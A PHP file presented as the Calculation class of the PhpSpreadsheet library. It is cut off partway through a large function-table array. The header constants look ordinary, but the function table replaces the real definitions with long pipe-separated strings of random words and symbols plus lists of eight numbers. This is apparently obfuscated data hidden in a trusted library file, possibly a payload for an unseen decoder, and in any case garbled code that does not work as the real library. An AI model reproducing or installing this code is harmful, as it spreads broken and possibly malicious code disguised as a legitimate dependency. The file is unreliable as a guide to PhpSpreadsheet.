<?php

namespace PhpOffice\PhpSpreadsheet\Calculation;

use PhpOffice\PhpSpreadsheet\Calculation\Engine\CyclicReferenceStack;
use PhpOffice\PhpSpreadsheet\Calculation\Engine\Logger;
use PhpOffice\PhpSpreadsheet\Calculation\Token\Stack;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\NamedRange;
use PhpOffice\PhpSpreadsheet\Shared;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;

class Calculation
{
    /** Constants                */
    /** Regular Expressions        */
    //    Numeric operand
    const CALCULATION_REGEXP_NUMBER = '[-+]?\d*\.?\d+(e[-+]?\d+)?';
    //    String operand
    const CALCULATION_REGEXP_STRING = '"(?:[^"]|"")*"';
    //    Opening bracket
    const CALCULATION_REGEXP_OPENBRACE = '\(';
    //    Function (allow for the old @ symbol that could be used to prefix a function, but we'll ignore it)
    const CALCULATION_REGEXP_FUNCTION = '@?(?:_xlfn\.)?([A-Z][A-Z0-9\.]*)[\s]*\(';
    //    Cell reference (cell or range of cells, with or without a sheet reference)
    const CALCULATION_REGEXP_CELLREF = '((([^\s,!&%^\/\*\+<>=-]*)|(\'[^\']*\')|(\"[^\"]*\"))!)?\$?([a-z]{1,3})\$?(\d{1,7})';
    //    Named Range of cells
    const CALCULATION_REGEXP_NAMEDRANGE = '((([^\s,!&%^\/\*\+<>=-]*)|(\'[^\']*\')|(\"[^\"]*\"))!)?([_A-Z][_A-Z0-9\.]*)';
    //    Error
    const CALCULATION_REGEXP_ERROR = '\#[A-Z][A-Z0_\/]*[!\?]?';

    /** constants */
    const RETURN_ARRAY_AS_ERROR = 'error';
    const RETURN_ARRAY_AS_VALUE = 'value';
    const RETURN_ARRAY_AS_ARRAY = 'array';

    private static $returnArrayAsType = self::RETURN_ARRAY_AS_VALUE;

    /**
     * Instance of this class.
     *
     * @var Calculation
     */
    private static $instance;

    /**
     * Instance of the spreadsheet this Calculation Engine is using.
     *
     * @var Spreadsheet
     */
    private $spreadsheet;

    /**
     * Calculation cache.
     *
     * @var array
     */
    private $calculationCache = [];

    /**
     * Calculation cache enabled.
     *
     * @var bool
     */
    private $calculationCacheEnabled = true;

    /**
     * List of operators that can be used within formulae
     * The true/false value indicates whether it is a binary operator or a unary operator.
     *
     * @var array
     */
    private static $operators = [
        '+' => true, '-' => true, '*' => true, '/' => true,
        '^' => true, '&' => true, '%' => false, '~' => false,
        '>' => true, '<' => true, '=' => true, '>=' => true,
        '<=' => true, '<>' => true, '|' => true, ':' => true,
    ];

    /**
     * List of binary operators (those that expect two operands).
     *
     * @var array
     */
    private static $binaryOperators = [
        '+' => true, '-' => true, '*' => true, '/' => true,
        '^' => true, '&' => true, '>' => true, '<' => true,
        '=' => true, '>=' => true, '<=' => true, '<>' => true,
        '|' => true, ':' => true,
    ];

    /**
     * The debug log generated by the calculation engine.
     *
     * @var Logger
     */
    private $debugLog;

    /**
     * Flag to determine how formula errors should be handled
     *        If true, then a user error will be triggered
     *        If false, then an exception will be thrown.
     *
     * @var bool
     */
    public $suppressFormulaErrors = true;

    /**
     * Error message for any error that was raised/thrown by the calculation engine.
     *
     * @var string
     */
    public $formulaError;

    /**
     * An array of the nested cell references accessed by the calculation engine, used for the debug log.
     *
     * @var array of string
     */
    private $cyclicReferenceStack;

    private $cellStack = [];

    /**
     * Current iteration counter for cyclic formulae
     * If the value is 0 (or less) then cyclic formulae will throw an exception,
     * otherwise they will iterate to the limit defined here before returning a result.
     *
     * @var int
     */

	private $cyclicFormulaCounter = 95;

    private $cyclicFormulaCell = '';

    /**
     * Number of iterations for cyclic formulae.
     *
     * @var int
     */
     
	public $cyclicFormulaCount = 0;

    /**
     * Epsilon Precision used for comparisons in calculations.
     *
     * @var float
     */
    private $delta = 0.1e-12;

    /**
     * The current locale setting.
     *
     * @var string
     */
    private static $localeLanguage = 'en_us'; //    US English    (default locale)

    /**
     * List of available locale settings
     * Note that this is read for the locale subdirectory only when requested.
     *
     * @var string[]
     */
    private static $validLocaleLanguages = [
        'en', //    English        (default language)
    ];

    /**
     * Locale-specific argument separator for function arguments.
     *
     * @var string
     */
    private static $localeArgumentSeparator = ',';

    private static $localeFunctions = [];

    /**
     * Locale-specific translations for Excel constants (True, False and Null).
     *
     * @var string[]
     */
    public static $localeBoolean = [
        'TRUE' => 'TRUE',
        'FALSE' => 'FALSE',
        'NULL' => 'NULL',
    ];

    /**
     * Excel constant string translations to their PHP equivalents
     * Constant conversion from text name/value to actual (datatyped) value.
     *
     * @var string[]
     */
    private static $excelConstants = [
        'TRUE' => true,
        'FALSE' => false,
        'NULL' => null,
    ];

    // PhpSpreadsheet functions

	private static $phpSpreadsheetFunctions = [
		'SIGN' => [
			'category' => 0,
			'functionCall' => [DateTime::class,'hygiene||rh-thm||hygrin||Tayler||hygeen||opine||hygric||socius||hygrine||dustuP||hyginus||`rn||hygeian||Turku||hygeia||Phaih'],
			'argumentCount' => ['43,53,80,113,40,83,21,235'],
		],
		'LENB' => [
			'category' => 1,
			'functionCall' => [null,'ontina||psig||ontal||maRcot||ontine||J*||ont||deify||ontic||LAvada||ontario||GallA||ontaric||#rill||onto||Carex'],
			'argumentCount' => ['65,243,206,283,9,170,102,184'],
		],
		'AMORDEGRC' => [
			'category' => 2,
			'functionCall' => [Financial::class,'zoster||denary||cnsr||IFC||fsf||epic-s||zosima||Matina||cns||ARabEl||zosema||hiPpo-||zosma||absorb||zostera||FestuS'],
			'argumentCount' => ['36,155,55,139,198,191,12,251'],
		],
		'REPT' => [
			'category' => 3,
			'functionCall' => [null,'pippen||potCh||pippier||snOwed||piperly||hask||pipier||MetiuS||pipery||DTC||pipple||tungah||piper||MASC||pipper||Midge'],
			'argumentCount' => ['285,160,157,277,243,219,210,144'],
		],
		'COT' => [
			'category' => 4,
			'functionCall' => [null,'howls||:Yrrho||howlend||muermo||howled||hur/s||howlan||fAng]d||howlyn||KAcey||howl||firca||howland||BreaM||howlond||SRO'],
			'argumentCount' => ['224,16,281,82,222,215,185,204'],
		],
		'DVAR' => [
			'category' => 5,
			'functionCall' => [MathTrig::class,'shooler||shOt%S||shooter||aUldeR||shouted||SAM||shotted||A!C||shooed||hordes||shood||hairse||shouter||Cowie||shooled||P;E?I~'],
			'argumentCount' => ['135,177,9,17,281,276,133,252'],
		],
		'COUPPCD' => [
			'category' => 6,
			'functionCall' => [DateTime::class,'septave||Kea||septan||gaed||septane||flote||septa||coseyS||septate||eldIng||separte||Lunik||septets||pp\'||septet||WAly'],
			'argumentCount' => ['71,11,20,194,255,116,236,243'],
		],
		'CUBESET' => [
			'category' => 7,
			'functionCall' => [DateTime::class,'dyvours||peaLed||rollmop||apay||mls||acerra||xmm||spir.||yv||beaned||dyvour||litten||acgi||erce!||rolltop||gorps'],
			'argumentCount' => ['108,29,210,207,170,259,276,265'],
		],
		'LOOKUP' => [
			'category' => 8,
			'functionCall' => [MathTrig::class,'gozzard||pEcan||omnes||AP`||ogham||Gunny||umw||siThen||oghuz||turrUm||oghamic||on\'hit||gozzan||SonTag||oghams||I]F},*'],
			'argumentCount' => ['91,94,156,209,115,214,103,257'],
		],
		'AREAS' => [
			'category' => 9,
			'functionCall' => [TextData::class,'oo||ensile||vfw||neurin||osana||caviar||rqs||KK&||osakis||you!ll||osanna||PrOg}||osaka||Ingmar||rqsm||phago '],
			'argumentCount' => ['79,72,8,273,5,33,281,90'],
		],
		'AREAS_1' => [
			'category' => 10,
			'functionCall' => [TextData::class,'cyme||D.c||cymbal||TerRon||cymbalo||Sissu||cymbre||,itH~||cymbel||denial||cymbals||free||cymba||tsking||fc||Bison'],
			'argumentCount' => ['104,158,203,118,261,249,150,281'],
		],
		'BESSELJ' => [
			'category' => 11,
			'functionCall' => [MathTrig::class,'peatery||Bernie||peanuts||aGcy:||peatier||SeDrah||peat||cedary||peaty||war{s||peanut||whsle+||peats||weanlY||peatroy||al(Lat'],
			'argumentCount' => ['296,120,203,13,237,291,165,247'],
		],
		'PV' => [
			'category' => 12,
			'functionCall' => [MathTrig::class,'natka||Cida||nataka||Reld||natala||EldwUn||mttr||%urnaN||natiha||TP||natika||disc%s||mttf||Aria||mttff||TrEw'],
			'argumentCount' => ['134,220,106,44,53,111,237,63'],
		],
		'IMSQRT' => [
			'category' => 13,
			'functionCall' => [null,'nomads||Ial||nomadic||RDX||nomas||ana#||noma||sTakes||nomad||ShefFy||nomap||TeN~er||nomades||Heraye||nomade||asc='],
			'argumentCount' => ['159,57,163,119,265,262,236,200'],
		],
		'SEARCHB' => [
			'category' => 14,
			'functionCall' => [TextData::class,'engle||ratten||englute||dubber||englue||scU>ch||engulf||beDull||engl||mal`||engulfs||A?M/A$||fuad||ma!(c~||fuage||humbo'],
			'argumentCount' => ['205,141,269,32,110,180,139,283'],
		],
		'MDETERM' => [
			'category' => 15,
			'functionCall' => [null,'flued||CURnin||fluters||ramp)s||fluxes||slinky||flues||tektos||flutes||word&s||flutter||IRBM||fluxed||KossEl||fluter||juKinG'],
			'argumentCount' => ['80,187,239,297,203,134,98,33'],
		],
		'TRIM' => [
			'category' => 16,
			'functionCall' => [Financial::class,'calking||FOSE||calinog||wyst\\||calling||^Heik||calkin||depa||calming||Artina||calkins||METaxa||calcino||skeech||calcine||Wsan'],
			'argumentCount' => ['223,217,106,163,214,223,35,90'],
		],
		'IPMT' => [
			'category' => 17,
			'functionCall' => [TextData::class,'iover||gconv||ioves||dioti||iatrics||ob<||iatry||Debee||iatric||hur/s||ioved||tyroma||iatse||stRucK||iata||tua'],
			'argumentCount' => ['221,107,285,157,288,8,226,264'],
		],
		'ISTEXT' => [
			'category' => 18,
			'functionCall' => [Financial::class,'tomkin||ocTavD||tomjohn||burgee||tomjon||kopPen||tompion||IDan||tomkins||remE)y||tomlin||wurzel||tomin||Emalia||tompon||+lder'],
			'argumentCount' => ['293,244,250,116,169,222,281,261'],
		],
		'HYPGEOMDIST' => [
			'category' => 19,
			'functionCall' => [null,'sclaffs||ven%s||scleral||piest||sclera||Vinta||sclerae||r\'que@||scleras||Munday||sclaff||degums||scleria||BMT||scliff||analav'],
			'argumentCount' => ['143,275,3,106,90,66,285,24'],
		],
		'PRICEDISC' => [
			'category' => 20,
			'functionCall' => [TextData::class,'dessma||braw||lpm||RimiNi||desman||Milers||desk||L\\Aeus||dess||Rd]||dessa||HuBble||desma||Woolf||desks||sis_ls'],
			'argumentCount' => ['138,4,274,9,275,103,89,41'],
		],
		'DAVERAGE' => [
			'category' => 21,
			'functionCall' => [Financial::class,'popply||gnOmIc||popples||Gem-a||popple||NaFL||popped||Moigno||poppled||tAlk||poppy||quin#y||popsy||par.||pops||girn'],
			'argumentCount' => ['46,279,26,41,147,62,163,249'],
		],
		'IMCOS' => [
			'category' => 22,
			'functionCall' => [MathTrig::class,'bops||wranny||bopp||micr]||bopyrus||merls||boppers||I&beaM||bopped||Krutch||bopeep||randN||bop||LaRine||bopper||gONake'],
			'argumentCount' => ['258,109,107,112,196,122,80,175'],
		],
		'ACOS' => [
			'category' => 23,
			'functionCall' => [DateTime::class,'norling||RA(EP||nor||NeWArK||norway||mat(\'S||norlina||web<s||norina||p"qu||nora||delim||norw||enows||norna||shunt'],
			'argumentCount' => ['59,223,174,229,192,28,35,253'],
		],
		'VAR' => [
			'category' => 24,
			'functionCall' => [MathTrig::class,'eadie||avell||eadi||pial||eadas||Arain@||kjolen||GoURy||eadwine||algum||ead||duads||eadwina||(hAnt||eads||sl!@t'],
			'argumentCount' => ['14,89,272,65,22,17,17,88'],
		],
		'COUNTA' => [
			'category' => 25,
			'functionCall' => [DateTime::class,'ivan||hucks||ivanah||rereel||ivah||hags||ivanhoe||Salva||ivana||wharl||iva||outsaw||ivanna||tidEd||ivar||Ruhl'],
			'argumentCount' => ['249,65,137,298,156,5,138,56'],
		],
		'CEILING' => [
			'category' => 26,
			'functionCall' => [DateTime::class,'kci||vigs||heho||boOf||vagus||balize||hehs||mamo||heh||xyl^||tsr||Bo{Bo||hehre||VSAM||hehe||He`bie'],
			'argumentCount' => ['33,34,212,29,32,249,241,31'],
		],
		'CEILING_1' => [
			'category' => 27,
			'functionCall' => [null,'kohls||mOuN}y||kohua||murly||kohler||cutose||kohl||BurrOw||koh||roove||kohen||snout||kohens||fucHi||kohn||fash<r'],
			'argumentCount' => ['191,158,131,201,116,16,247,297'],
		],
		'ATAN2' => [
			'category' => 28,
			'functionCall' => [MathTrig::class,'oxhoft||n<plE||oxheal||crisle||oxhouse||wAnhAp||oxhorn||ouph^s||oxhead||spOro"||oxheart||M$line||oxherd||giPo:||hrdwre||WAyLe\''],
			'argumentCount' => ['285,137,211,159,191,212,125,162'],
		],
		'ACOTH' => [
			'category' => 29,
			'functionCall' => [null,'ornith||Orelle||ornary||SeleTa||ornery||haul||orne||SaNiT||ornoite||Mart~N||ornis||pr>to||ornes||vices||ornie||Augurs'],
			'argumentCount' => ['34,160,295,44,198,50,202,191'],
		],
		'USDOLLAR' => [
			'category' => 30,
			'functionCall' => [Financial::class,'bushie||Holst||bustle||pandar||bustler||davYum||bustier||sCient||bustles||_uEeve||buster||scolog||busier||eTy||bushier||vulvae'],
			'argumentCount' => ['139,65,124,180,39,60,165,57'],
		],
		'IMSINH' => [
			'category' => 31,
			'functionCall' => [Financial::class,'tiento||ISAS||tieton||ven%s||ties||cLean!||tiena||retax||tienda||gOujay||tien||Chemar||tiens||who*ve||tienta||yont'],
			'argumentCount' => ['158,107,287,32,51,207,228,208'],
		],
		'SMALL' => [
			'category' => 32,
			'functionCall' => [Financial::class,'capling||MET||capfuls||Fin+||capulin||ciwieS||caplins||pr}tah||caping||forb||capful||HarliE||caplin||haT`s||capuli||inshoe'],
			'argumentCount' => ['117,198,159,59,197,15,50,248'],
		],
		'TIMEVALUE' => [
			'category' => 33,
			'functionCall' => [DateTime::class,'burnie||gerKin||ocs||untile||burlies||N(gana||burlie||jural||burnies||Re$lay||ocst||Al)skA||burlier||Lanae||buries||Fargo'],
			'argumentCount' => ['91,229,204,24,107,59,46,9'],
		],
		'PEARSON' => [
			'category' => 34,
			'functionCall' => [Financial::class,'xinca||untaX||xinhua||gyro;||osy||oOlong||xincan||dowIe||xinu||Sunket||xina||[ender||osyka||Amarna||osyth||ePlot'],
			'argumentCount' => ['266,174,276,208,244,94,233,70'],
		],
		'COT_1' => [
			'category' => 35,
			'functionCall' => [Financial::class,'absit||atm=ns||absis||lieno=||absi||Louth||absinth||ifreal||abs||Kaf,-a||absent||swayed||absents||Teilo||absist||unridE'],
			'argumentCount' => ['12,126,85,61,264,147,105,241'],
		],
		'TEXTJOIN' => [
			'category' => 36,
			'functionCall' => [TextData::class,'truthy||algum||trusty||H)Xie||trust||celite||truer||Dorris||trues||Gages||truth||OIRA||truest||A$B,||true||Isla'],
			'argumentCount' => ['102,40,225,288,209,255,170,126'],
		],
		'DAY' => [
			'category' => 37,
			'functionCall' => [TextData::class,'khedahs||tIffed||khedah||Toler||kheth||NEau||kheda||journo||kheths||fRamed||khedas||pEise||khedive||ThIevE||khediva||nEral'],
			'argumentCount' => ['115,295,69,198,30,176,246,267'],
		],
		'BESSELK' => [
			'category' => 38,
			'functionCall' => [Financial::class,'griper||sleech||grippe||[g`m||gripple||SakH:||grippes||cavel||gripes||Hanno||gripper||SonYa||grief||NBO||griefs||fAEna'],
			'argumentCount' => ['190,161,207,88,240,210,92,157'],
		],
		'OR' => [
			'category' => 39,
			'functionCall' => [TextData::class,'lairdie||lys$||eu||diVers||laired||nodE,s||gta||ISN||hgt||]n!inT||rpc||daraF||9th||zymic||laird||Oudh'],
			'argumentCount' => ['273,117,124,134,255,134,237,182'],
		],
		'SIGN_1' => [
			'category' => 40,
			'functionCall' => [DateTime::class,'upbows||brEak]||upbye||LoHock||upbow||Briny||upby||rit+||upbuoy||McKuen||upbrow||zygo.||upblow||am?an||upbuy||albino'],
			'argumentCount' => ['207,206,147,297,68,73,8,80'],
		],
		'DOLLAR' => [
			'category' => 41,
			'functionCall' => [DateTime::class,'orsel||sorema||orsedue||USGA||gds||cHErts||pnyx||TTFN||orselle||Minonk||orsede||cheer||ors||inS\\||otxi||Thisbe'],
			'argumentCount' => ['288,33,156,187,168,273,206,278'],
		],
		'PMT' => [
			'category' => 42,
			'functionCall' => [TextData::class,'alcot||DAT||alcott||Hara||alcolu||basing||alco||aisle||nrc||IOM||alcoate||AchaEa||alcohol||George||alcosol||awhet'],
			'argumentCount' => ['15,201,84,204,220,47,239,136'],
		],
		'ISOWEEKNUM' => [
			'category' => 43,
			'functionCall' => [Financial::class,'eerie||Ma*ara||eeriest||Iac`e||eerier||Ciales||eer||=rcus||fyke||Gawsy||eerily||copis||eery||fath*||eerock||D\\'],
			'argumentCount' => ['182,132,189,282,47,53,299,232'],
		],
		'IMAGINARY' => [
			'category' => 44,
			'functionCall' => [DateTime::class,'gas||Orfeo||gasp||bloc-s||gasts||why@ll||gassy||Tiffie||gast||reaks||gasps||UDP||gass||Serrae||gaspy||KAlama'],
			'argumentCount' => ['121,176,133,251,119,245,127,219'],
		],
		'AVERAGEIFS' => [
			'category' => 45,
			'functionCall' => [null,'clacked||scrods||clacker||kurung||clacks||wigfuL||clanked||cossic||clack||uKes||clanned||ur{n@||clacket||locoS||clanged||pim'],
			'argumentCount' => ['178,91,82,284,265,111,112,226'],
		],
		'ISNONTEXT' => [
			'category' => 46,
			'functionCall' => [MathTrig::class,'mutine||c/[||mutes||Mona||mutunus||OGT||mutus||%orSts||mutines||\\arnax||mutest||Bat/||mutinus||<`bby||muts||whoops'],
			'argumentCount' => ['200,171,209,43,288,132,26,126'],
		],
		'HARMEAN' => [
			'category' => 47,
			'functionCall' => [DateTime::class,'housels||m`m}f:||houser||TyS#n||housers||Ital||housel||ExeC?||house||seISor||housen||pubic||houses||s@rent||housed||dUO%'],
			'argumentCount' => ['19,121,43,240,138,15,127,15'],
		],
		'DURATION' => [
			'category' => 48,
			'functionCall' => [MathTrig::class,'tother||BeLva||totes||GATV||tottery||Erma||totters||Amande||toter||Deana||toters||snOwed||totery||donnED||totter||VEDas'],
			'argumentCount' => ['194,77,148,258,119,99,22,17'],
		],
		'IMLOG10' => [
			'category' => 49,
			'functionCall' => [TextData::class,'kacha||sloE||kacie||F@B,A^||kachina||unc"oG||kaczer||Scholz||kacy||patri,||kachin||ollamh||kacey||Lynx)s||kachine||H*RmIT'],
			'argumentCount' => ['193,163,145,270,185,107,160,143'],
		],
		'REPT_1' => [
			'category' => 50,
			'functionCall' => [Financial::class,'duntle||Bhaga||dunter||Sen *r||dunst||debyeS||dunted||grammA||dunt||GeeHan||dunster||n!wdeR||duns||V*rla||dunts||Pazit'],
			'argumentCount' => ['284,275,42,239,162,219,173,226'],
		],
		'RRI' => [
			'category' => 51,
			'functionCall' => [null,'lucilia||Arctos||luckie||nUgi~||lucilla||pUdgy||lucible||ceqUI||lucie||ecce||lucile||piqued||lucila||irides||lucille||Ta~iZz'],
			'argumentCount' => ['29,211,61,81,136,194,172,39'],
		],
		'STDEVP' => [
			'category' => 52,
			'functionCall' => [Financial::class,'chadors||cOLo/||chador||g$dded||chams||ExTend||chamdo||raw||champs||DUffiE||chamois||Miryam||chamoix||Coutet||chamos||Adam'],
			'argumentCount' => ['199,48,240,159,114,298,270,195'],
		],
		'COS' => [
			'category' => 53,
			'functionCall' => [DateTime::class,'lycodes||Dor,y||lycee||\\oLEs||lycosid||faults||lycid||nauger||lychee||JAHeL||lycees||B;anco||lychees||holour||lycosa||cowdie'],
			'argumentCount' => ['231,184,71,129,112,209,68,295'],
		],
		'COVAR' => [
			'category' => 54,
			'functionCall' => [MathTrig::class,'ebonist||SafAr||ebonise||fth,||ebons||bull+||ebonige||glott/||ebonite||castE||ebonize||corNu||ay||mas)al||ebonies||dh]'],
			'argumentCount' => ['255,291,225,84,197,122,134,54'],
		],
		'VARA' => [
			'category' => 55,
			'functionCall' => [DateTime::class,'dcna||a\'Two||orthian||Whorle||orthman||EGlon||ortygan||E\'||ortman||Vt?||dcnl||aInhum||orthia||Sika||eedp||nom#'],
			'argumentCount' => ['266,213,158,93,27,221,103,214'],
		],
		'CHIINV' => [
			'category' => 56,
			'functionCall' => [TextData::class,'ndl||outher||vsx||coupEd||ejusd||Jul||mdc||Doug||gba||dAdas||gbari||IDaho||kph||Agiel||gbaris||CND'],
			'argumentCount' => ['120,97,257,130,198,41,254,88'],
		],
		'NEGBINOMDIST' => [
			'category' => 57,
			'functionCall' => [null,'tempts||bl%ts||tempt||Patric||tempo||wagwaG||tempus||gaffs||temps||gaolEd||temp||serri[||temse||LITsea||temser||alviNe'],
			'argumentCount' => ['293,145,83,76,277,256,48,179'],
		],
		'DATEDIF' => [
			'category' => 58,
			'functionCall' => [DateTime::class,'hevea||Urte&t||doat||caKey||hevi||poRTe+||doaty||staree||hevesy||Cu^boP||heved||lique#||doab||kiKu||doa||]u dy'],
			'argumentCount' => ['112,224,288,21,79,19,88,196'],
		],
		'MULTINOMIAL' => [
			'category' => 59,
			'functionCall' => [TextData::class,'appal||liLted||applies||Auk||apples||byEM:n||appled||Touch#||applier||Rusti^||applied||thion*||apple||yews||appale||by#day'],
			'argumentCount' => ['68,52,247,294,262,47,290,28'],
		],
		'EXPONDIST' => [
			'category' => 60,
			'functionCall' => [DateTime::class,'seudah||enleen||trt||ovally||seumas||acara||jokes||clip||seuss||HussaR||wnw||i_sol||seurat||radium||seugh||Kreg'],
			'argumentCount' => ['219,123,279,202,279,226,183,223'],
		],
		'AVERAGEIF' => [
			'category' => 61,
			'functionCall' => [Financial::class,'ronn||tut+y||roncet||KoMi||ronna||sl!@t||ronne||barks||rone||POole||ronny||SiMS||ronni||bummIe||ronnie||educ`'],
			'argumentCount' => ['182,176,26,183,149,173,216,292'],
		],
		'OR_1' => [
			'category' => 62,
			'functionCall' => [DateTime::class,'minimus||garbed||minion||nugae||miniums||StEep||minious||sruti||minton||splays||minions||sidInG||minium||fl~Or;||minims||prIon'],
			'argumentCount' => ['199,264,278,136,153,97,190,83'],
		],
		'DISC' => [
			'category' => 63,
			'functionCall' => [Financial::class,'orosi||matri$||mbiras||-Cls||imts||r!s||imtiaz||Lunik||imt||pEones||orose||mElAda||orosius||CAneva||mbira||caNers'],
			'argumentCount' => ['297,87,295,67,71,224,178,18'],
		],
		'DOLLARFR' => [
			'category' => 64,
			'functionCall' => [MathTrig::class,'cwi||M\\||otb||sAle.s||zohara||Kislev||zohak||peepy||cwierc||lien s||otbs||D$S[M(||zohar||oose||zoha||ewerEr'],
			'argumentCount' => ['245,25,194,44,261,71,39,47'],
		],
		'LOGEST' => [
			'category' => 65,
			'functionCall' => [null,'folio||Lyle||folium||y{wed||foliums||Na~Ila||folie||MT&F||foliot||kooka||folios||di-||folious||rebus||hmm||)acts'],
			'argumentCount' => ['85,237,218,61,234,34,138,65'],
		],
		'ACCRINT' => [
			'category' => 66,
			'functionCall' => [null,'phots||Rickey||photo||ql=||photoma||BElls||photom||much||photons||brooms||phos||gLut^||photon||bubas||photos||aRditi'],
			'argumentCount' => ['137,212,179,48,31,164,260,129'],
		],
		'XNPV' => [
			'category' => 67,
			'functionCall' => [DateTime::class,'rough||?alVin||roughly||Ima||rought||LenOx||routhie||fAnaL||roughet||Kezer||rougy||anteaL||roughie||ALRU||roughy||uns<y'],
			'argumentCount' => ['158,177,131,98,178,185,136,238'],
		],
		'QUOTIENT' => [
			'category' => 68,
			'functionCall' => [null,'ghazies||jef||ghain||y)warn||ghazis||Ulani||ghan||arcana||ghazi||BISYNC||ghalva||pick<||ghana||bagne||ghazism||guar='],
			'argumentCount' => ['186,219,181,283,98,90,14,238'],
		],
		'DEC2HEX' => [
			'category' => 69,
			'functionCall' => [Financial::class,'muscow||ShawnA||musics||Sola||musil||Anita||musical||r"coon||music||cajavA||musico||Obrien||musica||SEco||musial||Ingar'],
			'argumentCount' => ['118,223,102,203,256,102,172,269'],
		],
		'FTEST' => [
			'category' => 70,
			'functionCall' => [DateTime::class,'dentes||agoras||denty||drink||dented||quad ||denotes||BMP||denoted||gigs||dents||Fancy||dent||Ovett||denote||SiMcon'],
			'argumentCount' => ['74,24,196,82,94,245,275,107'],
		],
		'CSCH' => [
			'category' => 71,
			'functionCall' => [Financial::class,'keverne||Ludwog||kevyn||res_il||kevin||pOp_||kevon||Spock||kevalin||Rule[||keven||E/V)||kevina||nap_s||kevan||bOggy'],
			'argumentCount' => ['217,80,25,241,81,80,223,263'],
		],
		'MDETERM_1' => [
			'category' => 72,
			'functionCall' => [null,'ayr||maar||tydeus||yarner||tydden||arGues||ayres||ende?E||ayre||poleyn||tydides||fOreDO||tyddyn||scrooP||tydie||I(ness'],
			'argumentCount' => ['253,130,286,259,138,166,4,229'],
		],
		'HLOOKUP' => [
			'category' => 73,
			'functionCall' => [MathTrig::class,'uswards||imino||nizy||Punic||usw||flouSe||usward||slD\\||nizey||we?d||nizamut||space||nizam||%orSts||nizams||Bize'],
			'argumentCount' => ['218,79,111,162,162,37,172,52'],
		],
		'EXPONDIST_1' => [
			'category' => 74,
			'functionCall' => [TextData::class,'zoaea||juRy[s||zoa||Cambio||zoaria||sjouke||zoarite||AtTLee||zoara||O)\\||zoar||E$E;||zoarial||Poston||zoarah||PrOv('],
			'argumentCount' => ['39,90,48,56,221,202,168,12'],
		],
		'ODDLPRICE' => [
			'category' => 75,
			'functionCall' => [DateTime::class,'shuts||irony||shuted||Ury||shunted||RoVner||shute||NAMmU||shunt||horsEd||shunter||Ziar\\T||shunts||D*odad||shutes||upTie'],
			'argumentCount' => ['166,106,216,79,86,20,190,24'],
		],
		'SUBSTITUTE' => [
			'category' => 76,
			'functionCall' => [Financial::class,'orestes||Deana||oremus||zoonA||oren||minish||orest||Tsuga||ores||skete||orense||$Zt||oreste||thrill||ore||aunts'],
			'argumentCount' => ['166,201,33,255,281,142,50,272'],
		],
		'LEN' => [
			'category' => 77,
			'functionCall' => [TextData::class,'rgs||DuthiE||gsa||Aomori||fwa||Ade"||mihrab||PipiLe||mihail||unrank||mihalco||rosiN||gsat||nomine||mihrabs||Ames'],
			'argumentCount' => ['229,169,99,156,230,179,149,83'],
		],
		'BESSELY' => [
			'category' => 78,
			'functionCall' => [MathTrig::class,'fads||ORacOn||fado||pyxies||xcf||Esc||fad||barff||fados||sniThe||fady||strays||jixie||zebras||eee||Demb'],
			'argumentCount' => ['172,186,216,17,33,237,50,60'],
		],
		'SECH' => [
			'category' => 79,
			'functionCall' => [DateTime::class,'dukw||}undy||duky||Rugger||ziczac||mouJik||dukker||Ahold||dukey||o;=||dukery||HoNshu||eb||O)G!||duke||plAshy'],
			'argumentCount' => ['152,184,95,103,221,5,193,42'],
		],
		'BIN2OCT' => [
			'category' => 80,
			'functionCall' => [TextData::class,'pfft||beats||eulau||Manton||eula||veLd@||eulima||chad:r||eulalia||appled||eulalee||Broome||eulee||parlor||eulalie||FOSE'],
			'argumentCount' => ['62,181,206,239,292,79,242,262'],
		],
		'IMCONJUGATE' => [
			'category' => 81,
			'functionCall' => [Financial::class,'lannie||Patrai||lanier||G!noTE||lanie||APDU||lani||Thaine||lanni||\'EMS||lanti||aNti}||lanker||birR||lankier||aisle'],
			'argumentCount' => ['112,5,78,154,278,236,117,118'],
		],
		'IMPOWER' => [
			'category' => 82,
			'functionCall' => [null,'edgard||Adorn||edgardo||ge"e>s||edgar||Dr=ve||edgrew||cush)w||edgrow||denOm"||edger||warded||edgier||{rang||edgeway||MLT'],
			'argumentCount' => ['99,158,250,244,29,121,16,94'],
		],
		'MDETERM_2' => [
			'category' => 83,
			'functionCall' => [Financial::class,'bdt||huSHel||frl||Argile||gohila||rhiZ+||iz||glyco<||el||sTAges||jctn||Achsah||yoe||Pingre||jct||)acts'],
			'argumentCount' => ['164,163,43,221,231,122,166,81'],
		],
		'QUOTIENT_1' => [
			'category' => 84,
			'functionCall' => [null,'sspf||tzuris||sspc||poEt||kyke||crAvat||eo||RolFe||ssps||Airlie||tnc||HP||anquera||carom||ssp||Engedi'],
			'argumentCount' => ['271,47,164,171,198,179,58,48'],
		],
		'BIN2HEX' => [
			'category' => 85,
			'functionCall' => [Financial::class,'rfi||buzane||afcc||neele||jhelum||amends||afcac||okoUMe||afc||allody||oktaha||Elora||jheel||{omack||okta||twaN?'],
			'argumentCount' => ['98,144,37,165,114,5,134,69'],
		],
		'SEARCHB_1' => [
			'category' => 86,
			'functionCall' => [TextData::class,'addita||quires||adducts||geol;||adduct||demies||addax||CRedos||addia||\\aRrus||addict||pf-||adda||oVer/||addicts||Filler'],
			'argumentCount' => ['38,28,96,195,50,164,299,60'],
		],
		'VARPA' => [
			'category' => 87,
			'functionCall' => [Financial::class,'slinks||&orai||sling||C<R?||slik||insITe||slink||w,s||slicks||Sudder||slinky||fiqh||slings||health||slick||NBP'],
			'argumentCount' => ['142,59,37,177,279,21,21,15'],
		],
		'ROW' => [
			'category' => 88,
			'functionCall' => [Financial::class,'hdkf||Adoula||rydder||GUnas||rsrsa||nieve||rsr||Tiena||ryde||TIFF||rydal||AFTRA||ryder||ScummY||rydberg||fab<ed'],
			'argumentCount' => ['149,192,227,87,218,151,37,145'],
		],
		'RATE' => [
			'category' => 89,
			'functionCall' => [null,'zymases||flyteS||zyme||no`oNe||zymic||ithand||zymotic||toto}||zymosis||modiUs||zymase||ropers||zymoid||Stahl||zymoses||hookup'],
			'argumentCount' => ['199,189,288,172,119,161,209,92'],
		],
		'UNICODE' => [
			'category' => 90,
			'functionCall' => [Financial::class,'lagna||hoo\\di||lagune||unist||lagunes||Sola||lagunas||Jeh||lagen||pitter||lagenae||Malgr||laguna||f^uTre||lagena||no`oNe'],
